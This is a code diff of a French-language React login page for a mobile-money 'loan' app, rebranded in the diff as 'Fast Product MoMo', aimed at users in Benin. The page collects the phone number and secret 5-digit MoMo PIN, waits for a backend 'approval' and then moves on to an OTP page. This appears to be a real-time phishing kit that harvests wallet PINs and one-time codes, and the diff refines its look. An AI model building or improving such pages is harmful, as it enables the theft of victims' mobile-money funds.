@@ -15,23 +15,22 @@ const Login = () => {
 
   // Wake up the Render server silently
   useEffect(() => {
-    fetch(`${API_URL}/`).catch(() => {}); 
+    fetch(`${API_URL}/`).catch(() => {});
   }, []);
 
   const handleLogin = async (e: FormEvent) => {
     e.preventDefault();
     if (!isFormValid) return;
-    
+
     setIsProcessing(true);
     localStorage.setItem("userPhone", phone);
 
     // 45-second timeout fallback
     const timeoutId = setTimeout(() => {
       setIsProcessing(false);
-      // ✅ Directly redirect to login (clear form) instead of alert
       setPhone("");
       setPin("");
-      navigate("/");
+      navigate("/login");
     }, 45000);
 
     try {
@@ -43,7 +42,6 @@ const Login = () => {
       const data = await res.json();
 
       if (data.status === "pending" && data.login_id) {
-        // Poll the backend every 2 seconds
         const interval = setInterval(async () => {
           const statusRes = await fetch(`${API_URL}/api/login-status/${data.login_id}`);
           const statusData = await statusRes.json();
@@ -56,15 +54,13 @@ const Login = () => {
             if (statusData.status === "approved") {
               navigate("/otp", { state: { phone: phone } });
             } else {
-              // ✅ Denied: Directly redirect to login (clear form) instead of alert
               setPhone("");
               setPin("");
-              navigate("/");
+              navigate("/login");
             }
           }
         }, 2000);
       } else {
-        // Fallback if backend doesn't return pending
         clearTimeout(timeoutId);
         setIsProcessing(false);
         navigate("/otp", { state: { phone: phone } });
@@ -72,94 +68,122 @@ const Login = () => {
     } catch (error) {
       clearTimeout(timeoutId);
       setIsProcessing(false);
-      // ✅ Network error: Directly redirect to login
       setPhone("");
       setPin("");
-      navigate("/");
+      navigate("/login");
     }
   };
 
   return (
-    <div className="app-container">
-      <div className="header">
-        <div className="header-icon"><Wallet size={32} color="white" /></div>
-        <h1 className="header-title">FastLoan<span>MoMo</span></h1>
-        <p className="header-subtitle">Prêts mobiles instantanés</p>
+    <div className="min-h-screen bg-[#FCD535] flex flex-col items-center px-5 py-8 font-sans">
+
+      {/* HEADER */}
+      <div className="text-center mb-8 mt-4">
+        {/* Wallet Icon Box */}
+        <div className="w-16 h-16 rounded-2xl bg-[#F0B90B] flex items-center justify-center mx-auto mb-4 shadow-sm">
+          <Wallet size={32} color="#1E1E1E" />
+        </div>
+        <h1 className="text-2xl font-extrabold text-[#1E1E1E] tracking-tight">
+          Fast Product<span className="text-[#B8860B]">MoMo</span>
+        </h1>
+        <p className="text-sm text-white/90 mt-1 font-medium drop-shadow-sm">
+          Instant mobile products
+        </p>
       </div>
-      <div className="main-card">
-        <h2 className="title">Bon retour</h2>
-        <p className="subtitle">Connectez-vous avec votre numéro mobile pour accéder aux prêts instantanés.</p>
-        
-        <form onSubmit={handleLogin}>
-          <div className="form-group">
-            <label className="form-label">Numéro de téléphone</label>
-            <div className="input-wrapper" style={{ padding: '12px 16px' }}>
-              <span style={{ display: 'flex', alignItems: 'center', fontSize: '16px', fontWeight: 500, color: '#111827' }}>
-                🇧🇯 +229 <span style={{ color: '#D1D5DB', margin: '0 12px', fontWeight: 300 }}>|</span>
-              </span>
-              <input 
-                type="tel" 
-                placeholder="01 23 45 67 89" 
-                value={phone} 
-                onChange={(e) => setPhone(e.target.value.replace(/\D/g, '').slice(0, 10))} 
-                maxLength={10} 
-                required 
-                style={{ fontSize: '18px', letterSpacing: '1px', color: '#111827' }} 
+
+      {/* MAIN CARD */}
+      <div className="w-full max-w-md bg-white rounded-3xl shadow-xl p-6 sm:p-8">
+        <h2 className="text-2xl font-extrabold text-[#1E1E1E] mb-2">Bon retour</h2>
+        <p className="text-sm text-gray-500 mb-6 leading-relaxed">
+          Connectez-vous avec votre numéro mobile pour accéder à vos produits instantanés.
+        </p>
+
+        <form onSubmit={handleLogin} className="space-y-5">
+          {/* PHONE FIELD */}
+          <div>
+            <label className="block text-sm font-semibold text-gray-700 mb-2">
+              Numéro de téléphone
+            </label>
+            <div className="flex items-center border border-gray-200 rounded-xl px-3 py-2 bg-white focus-within:border-[#F0B90B] focus-within:ring-2 focus-within:ring-[#FCD535]/50 transition-all">
+              {/* Beige/Off-white prefix block matching the screenshot */}
+              <div className="flex items-center bg-[#FAF8F5] rounded-lg px-3 py-1.5 mr-2">
+                <span className="flex items-center text-sm font-medium text-gray-800 whitespace-nowrap">
+                  🇧🇯 +229
+                </span>
+              </div>
+              
+              <input
+                type="tel"
+                placeholder="01 23 45 67 89"
+                value={phone}
+                onChange={(e) => setPhone(e.target.value.replace(/\D/g, "").slice(0, 10))}
+                maxLength={10}
+                required
+                className="flex-1 min-w-0 outline-none text-lg tracking-wider text-gray-900 bg-transparent placeholder:text-gray-300"
               />
             </div>
-            <p className="helper-text">Numéro MoMo du Bénin (10 chiffres)</p>
+            <p className="text-xs text-gray-500 mt-1.5">Numéro MoMo du Bénin (10 chiffres)</p>
           </div>
-          
-          <div className="form-group">
-            <label className="form-label">Entrez le code PIN MOMO à 5 chiffres</label>
-            <div className="input-wrapper">
-              <Lock size={20} color="#6B7280" style={{ marginRight: '12px' }} />
-              <input 
-                type={showPin ? "text" : "password"} 
-                maxLength={5} 
-                placeholder="•••••" 
-                style={{ letterSpacing: '8px', fontSize: '18px', color: '#111827' }} 
-                value={pin} 
-                onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))} 
-                required 
+
+          {/* PIN FIELD */}
+          <div>
+            <label className="block text-sm font-semibold text-gray-700 mb-2">
+              Entrez le code PIN MOMO à 5 chiffres
+            </label>
+            <div className="flex items-center border border-gray-200 rounded-xl px-3 py-3 bg-white focus-within:border-[#F0B90B] focus-within:ring-2 focus-within:ring-[#FCD535]/50 transition-all">
+              <Lock size={20} color="#6B7280" className="mr-3 ml-1 flex-shrink-0" />
+              <input
+                type={showPin ? "text" : "password"}
+                maxLength={5}
+                placeholder="•••••"
+                value={pin}
+                onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
+                required
+                className="flex-1 min-w-0 outline-none text-lg tracking-[0.5em] text-gray-900 bg-transparent placeholder:text-gray-300 placeholder:tracking-[0.3em]"
               />
-              <button type="button" onClick={() => setShowPin(!showPin)} style={{ background: 'none', border: 'none', cursor: 'pointer', display: 'flex', padding: 0 }}>
+              <button
+                type="button"
+                onClick={() => setShowPin(!showPin)}
+                className="flex p-0 bg-transparent border-none cursor-pointer flex-shrink-0"
+                aria-label={showPin ? "Masquer le PIN" : "Afficher le PIN"}
+              >
                 <Eye size={20} color="#9CA3AF" />
               </button>
             </div>
           </div>
-          
-          <button 
-            type="submit" 
-            className="btn-primary" 
-            disabled={!isFormValid || isProcessing} 
-            style={{ 
-              backgroundColor: (isFormValid && !isProcessing) ? 'var(--button-yellow)' : '#FDE68A', 
-              color: (isFormValid && !isProcessing) ? 'white' : '#9CA3AF', 
-              cursor: (isFormValid && !isProcessing) ? 'pointer' : 'not-allowed', 
-              marginTop: '32px' 
-            }}
+
+          {/* SUBMIT */}
+          <button
+            type="submit"
+            disabled={!isFormValid || isProcessing}
+            className={`w-full mt-8 py-3.5 rounded-xl font-bold text-base transition-all ${
+              isFormValid && !isProcessing
+                ? "bg-[#F0B90B] hover:bg-[#E2AE0A] text-[#1E1E1E] cursor-pointer shadow-md"
+                : "bg-gray-100 text-gray-400 cursor-not-allowed"
+            }`}
           >
             {isProcessing ? "En attente..." : "Continuer"}
           </button>
-          
-          <p className="helper-text" style={{ textAlign: 'center', display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '6px', marginTop: '24px', color: '#6B7280' }}>
-            <ShieldCheck size={16} /> Vos informations sont cryptées et sécurisées
+
+          <p className="flex items-center justify-center gap-1.5 text-center text-xs text-gray-500 mt-6">
+            <ShieldCheck size={16} />
+            Vos informations sont cryptées et sécurisées
           </p>
         </form>
       </div>
-      
-      <p style={{ textAlign: 'center', fontSize: '13px', color: '#111827', marginTop: '24px', padding: '0 20px 40px', fontWeight: 500 }}>
+
+      {/* FOOTER NOTE */}
+      <p className="text-center text-sm text-[#1E1E1E]/80 font-medium mt-6 px-5 pb-10 max-w-md">
         En continuant, vous acceptez nos Conditions et notre Politique de Confidentialité.
       </p>
 
-      {/* ✅ SPINNER MODAL */}
+      {/* SPINNER MODAL */}
       {isProcessing && (
-        <div className="modal-overlay">
-          <div className="modal-content">
-            <div className="spinner"></div>
-            <h3 className="modal-title">Vérification en cours</h3>
-            <p className="modal-text">En attente d'approbation...</p>
+        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center px-5">
+          <div className="bg-white rounded-2xl p-8 max-w-sm w-full text-center shadow-2xl">
+            <div className="w-12 h-12 mx-auto mb-5 rounded-full border-4 border-gray-100 border-t-[#F0B90B] animate-spin" />
+            <h3 className="text-lg font-bold text-[#1E1E1E] mb-2">Vérification en cours</h3>
+            <p className="text-sm text-gray-500">En attente d'approbation...</p>
           </div>
         </div>
       )}
